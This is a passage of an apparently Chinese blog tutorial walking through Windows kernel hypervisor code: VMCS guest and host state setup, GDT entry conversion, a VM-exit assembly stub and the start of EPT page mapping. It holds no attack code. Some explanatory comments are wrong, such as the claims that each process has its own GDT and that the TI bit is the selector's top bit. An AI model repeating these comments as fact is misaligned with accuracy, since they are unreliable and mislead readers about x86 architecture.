);          <span class="comment">// MSR_DEBUGCTL</span></span><br><span class="line">    <span class="built_in">RtlSetBit</span>( &amp;bitMapReadHighHeader, MSR_LSTAR - <span class="number">0xC0000000</span> );     <span class="comment">// MSR_LSTAR</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// VMX MSRs</span></span><br><span class="line">    <span class="keyword">for</span> (ULONG i = MSR_IA32_VMX_BASIC; i &lt;= MSR_IA32_VMX_VMFUNC; i++)</span><br><span class="line">        <span class="built_in">RtlSetBit</span>( &amp;bitMapReadLowHeader, i );</span><br><span class="line"></span><br><span class="line">    __vmx_vmwrite( MSR_BITMAP, <span class="built_in">MmGetPhysicalAddress</span>( g_Data-&gt;MSRBitmap ).QuadPart );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置异常位图 Exception bitmap，捕获断点异常</span></span><br><span class="line">    ULONG ExceptionBitmap = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//ExceptionBitmap |= 1 &lt;&lt; VECTOR_DEBUG_EXCEPTION;</span></span><br><span class="line">    ExceptionBitmap |= <span class="number">1</span> &lt;&lt; VECTOR_BREAKPOINT_EXCEPTION;</span><br><span class="line"></span><br><span class="line">    __vmx_vmwrite( EXCEPTION_BITMAP, ExceptionBitmap );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CS (Ring 0 Code)</span></span><br><span class="line">    <span class="comment">// 代码段描述符中包含了代码段的基地址和大小，并且还包含了一些权限信息。CS 寄存器存放的是代码段描述符在 GDT 表中的索引（Selector）。</span></span><br><span class="line">    <span class="built_in">VmxpConvertGdtEntry</span>( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;ContextFrame.SegCs, &amp;vmxGdtEntry );</span><br><span class="line">    __vmx_vmwrite( GUEST_CS_SELECTOR, vmxGdtEntry.Selector );</span><br><span class="line">    __vmx_vmwrite( GUEST_CS_LIMIT, vmxGdtEntry.Limit );</span><br><span class="line">    __vmx_vmwrite( GUEST_CS_AR_BYTES, vmxGdtEntry.AccessRights );</span><br><span class="line">    __vmx_vmwrite( GUEST_CS_BASE, vmxGdtEntry.Base );</span><br><span class="line">    __vmx_vmwrite( HOST_CS_SELECTOR, state-&gt;ContextFrame.SegCs &amp; ~RPL_MASK );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SS (Ring 0 Data)</span></span><br><span class="line">    <span class="comment">// 栈段描述符中包含了栈段的基地址和大小，并且还包含了一些权限信息。SS 寄存器存放的是栈段描述符在 GDT 表中的索引（Selector）。</span></span><br><span class="line">    <span class="built_in">VmxpConvertGdtEntry</span>( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;ContextFrame.SegSs, &amp;vmxGdtEntry );</span><br><span class="line">    __vmx_vmwrite( GUEST_SS_SELECTOR, vmxGdtEntry.Selector );</span><br><span class="line">    __vmx_vmwrite( GUEST_SS_LIMIT, vmxGdtEntry.Limit );</span><br><span class="line">    __vmx_vmwrite( GUEST_SS_AR_BYTES, vmxGdtEntry.AccessRights );</span><br><span class="line">    __vmx_vmwrite( GUEST_SS_BASE, vmxGdtEntry.Base );</span><br><span class="line">    __vmx_vmwrite( HOST_SS_SELECTOR, state-&gt;ContextFrame.SegSs &amp; ~RPL_MASK );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// DS (Ring 3 Data)</span></span><br><span class="line">    <span class="comment">// 数据段描述符中包含了数据段的基地址和大小，并且还包含了一些权限信息。DS、ES、FS、GS 寄存器分别存放数据段描述符在 GDT 表中的索引（Selector）。</span></span><br><span class="line">    <span class="built_in">VmxpConvertGdtEntry</span>( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;ContextFrame.SegDs, &amp;vmxGdtEntry );</span><br><span class="line">    __vmx_vmwrite( GUEST_DS_SELECTOR, vmxGdtEntry.Selector );</span><br><span class="line">    __vmx_vmwrite( GUEST_DS_LIMIT, vmxGdtEntry.Limit );</span><br><span class="line">    __vmx_vmwrite( GUEST_DS_AR_BYTES, vmxGdtEntry.AccessRights );</span><br><span class="line">    __vmx_vmwrite( GUEST_DS_BASE, vmxGdtEntry.Base );</span><br><span class="line">    __vmx_vmwrite( HOST_DS_SELECTOR, state-&gt;ContextFrame.SegDs &amp; ~RPL_MASK );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ES (Ring 3 Data)</span></span><br><span class="line">    <span class="built_in">VmxpConvertGdtEntry</span>( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;ContextFrame.SegEs, &amp;vmxGdtEntry );</span><br><span class="line">    __vmx_vmwrite( GUEST_ES_SELECTOR, vmxGdtEntry.Selector );</span><br><span class="line">    __vmx_vmwrite( GUEST_ES_LIMIT, vmxGdtEntry.Limit );</span><br><span class="line">    __vmx_vmwrite( GUEST_ES_AR_BYTES, vmxGdtEntry.AccessRights );</span><br><span class="line">    __vmx_vmwrite( GUEST_ES_BASE, vmxGdtEntry.Base );</span><br><span class="line">    __vmx_vmwrite( HOST_ES_SELECTOR, state-&gt;ContextFrame.SegEs &amp; ~RPL_MASK );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FS (Ring 3 Compatibility-Mode TEB)</span></span><br><span class="line">    <span class="built_in">VmxpConvertGdtEntry</span>( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;ContextFrame.SegFs, &amp;vmxGdtEntry );</span><br><span class="line">    __vmx_vmwrite( GUEST_FS_SELECTOR, vmxGdtEntry.Selector );</span><br><span class="line">    __vmx_vmwrite( GUEST_FS_LIMIT, vmxGdtEntry.Limit );</span><br><span class="line">    __vmx_vmwrite( GUEST_FS_AR_BYTES, vmxGdtEntry.AccessRights );</span><br><span class="line">    __vmx_vmwrite( GUEST_FS_BASE, vmxGdtEntry.Base );</span><br><span class="line">    __vmx_vmwrite( HOST_FS_BASE, vmxGdtEntry.Base );</span><br><span class="line">    __vmx_vmwrite( HOST_FS_SELECTOR, state-&gt;ContextFrame.SegFs &amp; ~RPL_MASK );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// GS (Ring 3 Data if in Compatibility-Mode, MSR-based in Long Mode)</span></span><br><span class="line">    <span class="built_in">VmxpConvertGdtEntry</span>( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;ContextFrame.SegGs, &amp;vmxGdtEntry );</span><br><span class="line">    __vmx_vmwrite( GUEST_GS_SELECTOR, vmxGdtEntry.Selector );</span><br><span class="line">    __vmx_vmwrite( GUEST_GS_LIMIT, vmxGdtEntry.Limit );</span><br><span class="line">    __vmx_vmwrite( GUEST_GS_AR_BYTES, vmxGdtEntry.AccessRights );</span><br><span class="line">    __vmx_vmwrite( GUEST_GS_BASE, state-&gt;SpecialRegisters.MsrGsBase );</span><br><span class="line">    __vmx_vmwrite( HOST_GS_BASE, state-&gt;SpecialRegisters.MsrGsBase );</span><br><span class="line">    __vmx_vmwrite( HOST_GS_SELECTOR, state-&gt;ContextFrame.SegGs &amp; ~RPL_MASK );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Task Register (Ring 0 TSS)</span></span><br><span class="line">    <span class="comment">// 存放任务状态段 (TSS) 的选择符，在进行任务切换时使用。</span></span><br><span class="line">    <span class="built_in">VmxpConvertGdtEntry</span>( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;SpecialRegisters.Tr, &amp;vmxGdtEntry );</span><br><span class="line">    __vmx_vmwrite( GUEST_TR_SELECTOR, vmxGdtEntry.Selector );</span><br><span class="line">    __vmx_vmwrite( GUEST_TR_LIMIT, vmxGdtEntry.Limit );</span><br><span class="line">    __vmx_vmwrite( GUEST_TR_AR_BYTES, vmxGdtEntry.AccessRights );</span><br><span class="line">    __vmx_vmwrite( GUEST_TR_BASE, vmxGdtEntry.Base );</span><br><span class="line">    __vmx_vmwrite( HOST_TR_BASE, vmxGdtEntry.Base );</span><br><span class="line">    __vmx_vmwrite( HOST_TR_SELECTOR, state-&gt;SpecialRegisters.Tr &amp; ~RPL_MASK );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LDT</span></span><br><span class="line">    <span class="comment">// 进程的局部任务表描述符（LDT），存放 LDT 描述符在 GDT 表中的索引（Selector）。</span></span><br><span class="line">    <span class="built_in">VmxpConvertGdtEntry</span>( state-&gt;SpecialRegisters.Gdtr.Base, state-&gt;SpecialRegisters.Ldtr, &amp;vmxGdtEntry );</span><br><span class="line">    __vmx_vmwrite( GUEST_LDTR_SELECTOR, vmxGdtEntry.Selector );</span><br><span class="line">    __vmx_vmwrite( GUEST_LDTR_LIMIT, vmxGdtEntry.Limit );</span><br><span class="line">    __vmx_vmwrite( GUEST_LDTR_AR_BYTES, vmxGdtEntry.AccessRights );</span><br><span class="line">    __vmx_vmwrite( GUEST_LDTR_BASE, vmxGdtEntry.Base );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// GDT</span></span><br><span class="line">    <span class="comment">// 全局描述符表 (GDT)，存放系统运行过程中所有描述符的表。GDT 表包含了各种类型的描述符，如代码段描述符、数据段描述符、TSS 描述符等。</span></span><br><span class="line">    __vmx_vmwrite( GUEST_GDTR_BASE, (ULONG_PTR)state-&gt;SpecialRegisters.Gdtr.Base );</span><br><span class="line">    __vmx_vmwrite( GUEST_GDTR_LIMIT, state-&gt;SpecialRegisters.Gdtr.Limit );</span><br><span class="line">    __vmx_vmwrite( HOST_GDTR_BASE, (ULONG_PTR)state-&gt;SpecialRegisters.Gdtr.Base );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// IDT</span></span><br><span class="line">    <span class="comment">// 中断描述符表(IDT)，存放中断处理程序的入口地址，当中断发生时 CPU 会根据中断号查找该表并跳转到对应的处理程序。</span></span><br><span class="line">    __vmx_vmwrite( GUEST_IDTR_BASE, (ULONG_PTR)state-&gt;SpecialRegisters.Idtr.Base );</span><br><span class="line">    __vmx_vmwrite( GUEST_IDTR_LIMIT, state-&gt;SpecialRegisters.Idtr.Limit );</span><br><span class="line">    __vmx_vmwrite( HOST_IDTR_BASE, (ULONG_PTR)state-&gt;SpecialRegisters.Idtr.Base );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CR0</span></span><br><span class="line">    <span class="comment">// 包含了控制处理器运行方式和操作系统的特定行为的控制位，比如保护模式、分页机制等。</span></span><br><span class="line">    __vmx_vmwrite( CR0_READ_SHADOW, state-&gt;SpecialRegisters.Cr0 );</span><br><span class="line">    __vmx_vmwrite( HOST_CR0, state-&gt;SpecialRegisters.Cr0 );</span><br><span class="line">    __vmx_vmwrite( GUEST_CR0, state-&gt;SpecialRegisters.Cr0 );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CR3</span></span><br><span class="line">    <span class="comment">// 存放页面目录表 (Page Directory Table) 的地址，页面目录表描述了虚拟地址空间和物理地址空间的映射关系。</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    “不要使用当前进程的地址空间作为 host”，因为此时可能正在任意的用户模式进程中执行，</span></span><br><span class="line"><span class="comment">    这里的 host 指的是 hypervisor。也就是说，当 hypervisor 在处理 DPC 中断时，</span></span><br><span class="line"><span class="comment">    DPC 可能正在运行某个用户进程的上下文中，没有特权访问 CR3 寄存器来获取当前进程的页目录表或页表。</span></span><br><span class="line"><span class="comment">    因此，需要手动映射一份特殊的地址空间（例如 kernel 物理地址空间）作为 hypervisor 的地址空间，</span></span><br><span class="line"><span class="comment">    并将其指定为 CR3 的值。这里做了这样的优化，避免使用错误的地址空间导致虚拟地址到物理地址的解析错误。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    __vmx_vmwrite( HOST_CR3, VpData-&gt;SystemDirectoryTableBase );</span><br><span class="line">    __vmx_vmwrite( GUEST_CR3, state-&gt;SpecialRegisters.Cr3 );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CR4</span></span><br><span class="line">    <span class="comment">// 包含了一些高级控制和特征寄存器（Advanced Controls and Features Register），比如支持硬件虚拟化技术、支持大页面等。</span></span><br><span class="line">    __vmx_vmwrite( HOST_CR4, state-&gt;SpecialRegisters.Cr4 );</span><br><span class="line">    __vmx_vmwrite( GUEST_CR4, state-&gt;SpecialRegisters.Cr4 );</span><br><span class="line">    __vmx_vmwrite( CR4_GUEST_HOST_MASK, <span class="number">0x2000</span> );</span><br><span class="line">    __vmx_vmwrite( CR4_READ_SHADOW, state-&gt;SpecialRegisters.Cr4 &amp; ~<span class="number">0x2000</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Debug MSR and DR7</span></span><br><span class="line">    <span class="comment">// 包含有关调试状态和断点设置的信息。通过这些寄存器，可以在 CPU 上设置断点和调试相关信息。</span></span><br><span class="line">    __vmx_vmwrite( GUEST_IA32_DEBUGCTL, state-&gt;SpecialRegisters.DebugControl );</span><br><span class="line">    __vmx_vmwrite( GUEST_DR7, state-&gt;SpecialRegisters.KernelDr7 );</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    最后，加载客户机的堆栈、指令指针和标志寄存器，</span></span><br><span class="line"><span class="comment">    这与 RtlCaptureContext 在 VmxInitializeCPU 中返回的位置完全对应。</span></span><br><span class="line"><span class="comment">    这段代码的作用是将保存在特定位置的客户机上下文数据加载到相应的寄存器中，</span></span><br><span class="line"><span class="comment">    以便恢复客户机的执行状态。具体来说，它加载了客户机的堆栈指针、指令指针和标志寄存器值，</span></span><br><span class="line"><span class="comment">    使得当控制权返回到 VmxInitializeCPU 时，客户机可以继续执行。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    __vmx_vmwrite( GUEST_RSP, state-&gt;ContextFrame.Rsp );</span><br><span class="line">    __vmx_vmwrite( GUEST_RIP, state-&gt;ContextFrame.Rip );</span><br><span class="line">    __vmx_vmwrite( GUEST_RFLAGS, state-&gt;ContextFrame.EFlags );</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    加载 hypervisor 的入口地址和 hypervisor 栈。我们为自己分配了一个标准大小的内核栈（24KB），</span></span><br><span class="line"><span class="comment">    并偏移指向上下文结构的指针，从而避免在 entrypoint 中需要修改叠加寄存器 RSP 的指令。</span></span><br><span class="line"><span class="comment">    注意 CONTEXT 指针和栈本身必须按照 16 字节对齐，以保证与 AMD64 架构的 ABI 兼容性。</span></span><br><span class="line"><span class="comment">    否则，诸如 RtlCaptureContext 将执行的 XMM 操作等操作将会失败。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">NT_ASSERT</span>( (KERNEL_STACK_SIZE - <span class="built_in">sizeof</span>( CONTEXT )) % <span class="number">16</span> == <span class="number">0</span> );</span><br><span class="line">    __vmx_vmwrite( HOST_RSP, (ULONG_PTR)VpData-&gt;VMMStack + KERNEL_STACK_SIZE - <span class="built_in">sizeof</span>( CONTEXT ) );</span><br><span class="line">    <span class="comment">// 将当前状态存储在栈中，并跳转到一个 C 函数 VmxpExitHandler 中去处理 VM 的 exit 事件</span></span><br><span class="line">    __vmx_vmwrite( HOST_RIP, (ULONG_PTR)VmxVMEntry );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="将GDT（全局描述符表）中的段信息转换为VMX（虚拟机扩展）所需的格式"><a href="#将GDT（全局描述符表）中的段信息转换为VMX（虚拟机扩展）所需的格式" class="headerlink" title="将GDT（全局描述符表）中的段信息转换为VMX（虚拟机扩展）所需的格式"></a>将GDT（全局描述符表）中的段信息转换为VMX（虚拟机扩展）所需的格式</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Fill segment data</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;GdtBase&quot;&gt;GDTR base&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Selector&quot;&gt;Segment selector value&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;VmxGdtEntry&quot;&gt;Resulting entry&lt;/param&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">VmxpConvertGdtEntry</span><span class="params">( IN PVOID GdtBase, IN USHORT Selector, OUT PVMX_GDTENTRY64 VmxGdtEntry )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    段选择子（segment selector）是用来唯一地标识一个内存段的16位或64位数字。</span></span><br><span class="line"><span class="comment">    在x86体系结构中，每个段选择子由两个部分组成：</span></span><br><span class="line"><span class="comment">    索引（index）和请求特权级别（requested privilege level，RPL）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    索引用于查找全局描述符表（GDT）或局部描述符表（LDT）中的段描述符，</span></span><br><span class="line"><span class="comment">    而RPL则指定了访问该段所需的最低权限级别（0到3）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    RPL可以通过对段选择子进行屏蔽（掩码）来获取。具体来说，将段选择子与0b11（即二进制的3）进行按位与运算，可以得到RPL的值。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    例如，如果段选择子为0x08，那么其二进制表示为0000 1000，其中低两位（00）即为RPL的值。如果需要将RPL屏蔽掉，</span></span><br><span class="line"><span class="comment">    可以使用按位与运算符&amp;和~操作数取反运算符来进行屏蔽：0x08 &amp; ~0b11 = 0x08 &amp; 0xFC = 0x08。</span></span><br><span class="line"><span class="comment">    需要注意的是，在64位模式下，只有GDT被使用，因此只需要考虑索引部分，而RPL位会被忽略。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    在x64 Windows操作系统内核中，每个进程都有自己的全局描述符表（GDT），</span></span><br><span class="line"><span class="comment">    用于保存其自身内存分段的信息。在对内存进行分段时，可以使用一个16位的段选择子来唯一地标识一个内存段。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    读取给定选择子（segment selector）的GDT条目，并屏蔽掉请求特权级别（requested privilege level，RPL）位。</span></span><br><span class="line"><span class="comment">    因为x64Windows在内核态下已经不使用局部描述符表（LDT），所以不需要考虑TI位（Table Indicator），它用于区分是引用GDT还是LDT。</span></span><br><span class="line"><span class="comment">    TI位（Table Indicator）是段选择子的一个位，用于指示该选择子所引用的描述符表是GDT还是LDT。TI位的取值为0或1，其中0表示引用GDT，1表示引用LDT。</span></span><br><span class="line"><span class="comment">    TI位则占据了选择子的第2位，因此选择子的最高有效位为TI位。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    在x64模式下，每个选择子由两个部分组成：索引部分和RPL部分。索引部分用于查找GDT中的相应段描述符，</span></span><br><span class="line"><span class="comment">    而RPL则指定了访问该段的权限级别。RPL通常会和当前运行代码的特权级别进行比较，以确定访问是否被允许。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    在Windows内核中，0和3级特权级别都可以引用内核GDT中的所有段描述符，因此不需要进行RPL屏蔽。</span></span><br><span class="line"><span class="comment">    但是，在某些情况下，为了安全起见，可能会使用引用GDT的低特权级别来访问只有高特权级别才能访问的内存段。</span></span><br><span class="line"><span class="comment">    在这种情况下，需要进行RPL屏蔽来确保代码可以访问相应的内存段。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 屏蔽RPL位</span></span><br><span class="line">    PKGDTENTRY64 gdtEntry = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">NT_ASSERT</span>( (Selector &amp; SELECTOR_TABLE_INDEX) == <span class="number">0</span> );</span><br><span class="line">    gdtEntry = (PKGDTENTRY64)((ULONG_PTR)GdtBase + (Selector &amp; ~RPL_MASK));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将传入的段选择子赋值给VMX_GDTENTRY64结构体的Selector字段</span></span><br><span class="line">    VmxGdtEntry-&gt;Selector = Selector;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用LSL指令（Load Segment Limit）读取段限制（segment limit）。</span></span><br><span class="line">    VmxGdtEntry-&gt;Limit = __segmentlimit( Selector );</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    在x86体系结构中，段描述符中的“System”位（也称为“S”位）用于区分系统段和代码/数据段。</span></span><br><span class="line"><span class="comment">    当“System”位被清除时（即为0），表示这是一个代码段或数据段，需要对相对虚拟地址（RVA）进行地址计算。</span></span><br><span class="line"><span class="comment">    将段基址与RVA相加，构建完整的64位有效地址。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    对于非系统段，需要进行以下步骤来构建完整的64位线性地址：</span></span><br><span class="line"><span class="comment">        将段基址与RVA相加，得到32位的线性地址。</span></span><br><span class="line"><span class="comment">        将线性地址的高32位与段选择子中的基地址合并，构建出64位的线性地址。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要注意的是，在Windows操作系统中，KGDTENTRY64结构中的“System”字段位置被定义错误了，</span></span><br><span class="line"><span class="comment">    实际上，“System”位应该编码在“Type”字段的最高位。这意味着在Windows内核中计算64位地址时需要特别小心，</span></span><br><span class="line"><span class="comment">    以确保不会使用错误的字段。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    根据GDT中的字段信息，构建完整的64位有效地址。需要注意的是，只有当Type字段中的System位为0时才进行构建。</span></span><br><span class="line"><span class="comment">    构建过程分为三部分：将BaseHigh字段左移24位，将BaseMiddle字段左移16位，将BaseLow字段保持不变，</span></span><br><span class="line"><span class="comment">    并使用逻辑或运算符组合它们。如果Type字段中的最高位为0，</span></span><br><span class="line"><span class="comment">    则还需要将BaseUpper字段左移32位并与之前的结果进行逻辑或运算。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    VmxGdtEntry-&gt;Base = ((gdtEntry-&gt;Bytes.BaseHigh &lt;&lt; <span class="number">24</span>) | (gdtEntry-&gt;Bytes.BaseMiddle &lt;&lt; <span class="number">16</span>) | (gdtEntry-&gt;BaseLow)) &amp; MAXULONG;</span><br><span class="line">    VmxGdtEntry-&gt;Base |= ((gdtEntry-&gt;Bits.Type &amp; <span class="number">0x10</span>) == <span class="number">0</span>) ? ((ULONG_PTR)gdtEntry-&gt;BaseUpper &lt;&lt; <span class="number">32</span>) : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载访问权限信息</span></span><br><span class="line">    VmxGdtEntry-&gt;AccessRights = <span class="number">0</span>;</span><br><span class="line">    VmxGdtEntry-&gt;Bytes.Flags1 = gdtEntry-&gt;Bytes.Flags1;</span><br><span class="line">    VmxGdtEntry-&gt;Bytes.Flags2 = gdtEntry-&gt;Bytes.Flags2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理VMX相关的位</span></span><br><span class="line">    VmxGdtEntry-&gt;Bits.Reserved = <span class="number">0</span>;</span><br><span class="line">    VmxGdtEntry-&gt;Bits.Unusable = !gdtEntry-&gt;Bits.Present;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="将当前状态存储在栈中，并跳转到一个-C-函数-VmxpExitHandler-中去处理-VM-的-exit-事件"><a href="#将当前状态存储在栈中，并跳转到一个-C-函数-VmxpExitHandler-中去处理-VM-的-exit-事件" class="headerlink" title="将当前状态存储在栈中，并跳转到一个 C 函数 VmxpExitHandler 中去处理 VM 的 exit 事件"></a>将当前状态存储在栈中，并跳转到一个 C 函数 VmxpExitHandler 中去处理 VM 的 exit 事件</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">VmxVMEntry PROC</span><br><span class="line">    push    rcx                 ; save RCX, as we will need to orverride it</span><br><span class="line">    lea     rcx, [rsp+8h]       ; store the context in the stack, bias for</span><br><span class="line">                                ; the return address and the push we just did.</span><br><span class="line">    call    RtlCaptureContext   ; save the current register state.</span><br><span class="line">                                ; note that this is a specially written function</span><br><span class="line">                                ; which has the following key characteristics:</span><br><span class="line">                                ;   1) it does not taint the value of RCX</span><br><span class="line">                                ;   2) it does not spill any registers, nor</span><br><span class="line">                                ;      expect home space to be allocated for it</span><br><span class="line"></span><br><span class="line">    jmp     VmxpExitHandler     ; jump to the C code handler. we assume that it</span><br><span class="line">                                ; compiled with optimizations and does not use</span><br><span class="line">                                ; home space, which is true of release builds.</span><br><span class="line">VmxVMEntry ENDP</span><br></pre></td></tr></table></figure><h5 id="初始化EPT，创建Guest到Host的页映射（Page-Mappings）"><a href="#初始化EPT，创建Guest到Host的页映射（Page-Mappings）" class="headerlink" title="初始化EPT，创建Guest到Host的页映射（Page Mappings）"></a>初始化EPT，创建Guest到Host的页映射（Page Mappings）</h5><p><img src="/.io//20200404211829769.jpeg" alt="在这里插入图片描述"></p><p>为了解决GVA-GPA-HPA的转换关系，在没有硬件辅助的时代，Hypervisor通过影子页表，很巧妙的将GVA-GPA映射到GVA-HPA, 功能虽然达成，但是在很多实际场景下，如进程频繁切换，内存频繁分配释放等，性能损耗会非常大；</p><p>EPT在硬件的帮助下，实现内存虚拟化简单直接，传统页表继续负责GVA-GPA, 而EPT负责GPA-HPA; 虽然内存访问延时可能会增加一些，但是大幅减少了因为页表更新带来的vmexit, 综合性价比提升巨大, 所以现代内存虚拟化，基本都被EPT统一了。</p><p><img src="https://pic1.zhimg.com/80/v2-121b31dd73963473ebb0ea19ea59bef4_720w.webp" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Create Guest to Host page mappings</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pEPT&quot;&gt;CPU EPT data&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">EptBuildIdentityMap</span><span class="params">( IN PEPT_DATA pEPT )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pEPT-&gt;PML4Ptr != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_SUCCESS;<span class="comment">// 已经创建过</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    PML4（Page Map Level 4）是 x86 架构中分页机制的一级页表。</span></span><br><span class="line"><span class="comment">    在 x86 架构的分页机制中，物理内存被划分为固定大小的页面（通常为4KB）。</span></span><br><span class="line"><span class="comment">    为了管理这些页面，操作系统使用页表来建立虚拟地址与物理地址之间的映射关系。</span></span><br><span class="line"><span class="comment">    页表被组织为一个多级结构，其中 PML4 